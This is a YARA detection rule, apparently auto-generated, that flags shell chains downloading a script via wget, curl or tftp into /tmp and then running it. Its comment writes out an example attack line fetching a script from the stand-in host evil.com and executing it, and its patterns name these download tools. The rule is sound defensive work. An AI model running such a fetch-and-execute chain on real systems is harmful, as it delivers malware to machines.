rule rule_003_Malicious_Download_Execute_Chain_Multi_Protocol {
    /*
     * Detects multi-protocol download chains with immediate execution,
     * commonly used by malware droppers and initial access payloads.
     * 
     * Example match:
     *   wget http://evil.com/script.sh -O /tmp/script.sh 2>/dev/null || curl -s http://evil.com/script.sh -o /tmp/script.sh 2>/dev/null
     *   chmod +x /tmp/script.sh
     *   /tmp/script.sh
     */
    meta:
        description = "Multi-protocol download chain with immediate execution"
        severity = "High"
        confidence = "0.91"
        mitre_technique = "T1105"
        author = "Script Sentinel"

    // Provenance (auto-generated, do not edit)
    generated_by = "sentinel-generate"
    generated_at = "2025-12-28"
    source_scripts = "0f587df60a5f86c7"
    approved_by = "Script Sentinel Team"
    approved_at = "2025-12-28"
    strings:
        // Download tools with error suppression
        $wget = /wget\s+http[^\s]+.*2>\/dev\/null/ nocase
        $curl = /curl\s+[^|]*http[^\s]+.*2>\/dev\/null/ nocase
        $tftp = /tftp\s+[^|]*-[gl][^|]*2>\/dev\/null/ nocase
        
        // Fallback operators between download attempts
        $fallback = "||" nocase
        
        // Make executable and execute pattern
        $chmod_exec = /chmod\s+\+x\s+\/tmp\/[^\s]+/ nocase
        $tmp_exec = /\/tmp\/[a-zA-Z0-9_.-]+\.sh/ nocase
        
        // Temp file patterns
        $tmp_download = /-[Oo]\s+\/tmp\/[^\s]+/ nocase

    condition:
        // Multiple download methods with fallbacks
        (
            ($wget and $curl) or ($wget and $tftp) or ($curl and $tftp)
        ) and
        $fallback and
        (
            $chmod_exec or ($tmp_download and $tmp_exec)
        )
}